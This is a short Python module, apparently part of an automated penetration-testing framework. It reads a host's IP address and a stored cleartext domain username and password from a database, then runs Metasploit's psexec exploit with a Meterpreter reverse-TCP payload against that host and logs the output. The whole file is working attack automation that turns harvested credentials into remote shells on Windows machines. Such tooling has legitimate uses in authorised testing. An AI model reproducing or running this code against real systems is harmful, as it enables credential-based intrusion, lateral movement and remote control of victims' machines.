from msf import exploit

def run(params):
    sql = """
        select
            hd.id, hd.ip_address, dc.domain, dc.username, dc.cleartext_password
        from
            domain_credentials_map m
            join host_data hd on hd.id = m.host_data_id
            join domain_credentials dc on dc.id = m.domain_credentials_id
        where
            m.id = %s"""
            
    cursor = params.db.cursor()
    cursor.execute(sql,  params.item_identifier)
    row = cursor.fetchone()
    host_data_id = row[0]
    #print "log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4])
    params.log("log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4]))
    cursor.close()
    
    setup = [
        "use exploit/windows/smb/psexec", 
        "set PAYLOAD windows/meterpreter/reverse_tcp", 
        "set RHOST {0}".format(row[1]),
        "set LHOST {0}".format(params.getLocalHost()),
        "set LPORT {0}".format(params.getOpenPort()),
        "set smbdomain {0}".format(row[2]),
        "set smbuser {0}".format(row[3]),
        "set smbpass {0}".format(row[4]),
        "exploit"
    ]
    
    log = ""
    
    for l in exploit.runMsf(params, row[0], setup, "psexec"):
        log = log + l + "\r\n"
    
    #TODO: add way to verify whether the psexec run was successful,
    #if it was, mark it as so in the host_data table
    #exclude these from future runs
    cursor = params.db.cursor()
    cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (host_data_id, 4, log))
    cursor.close()
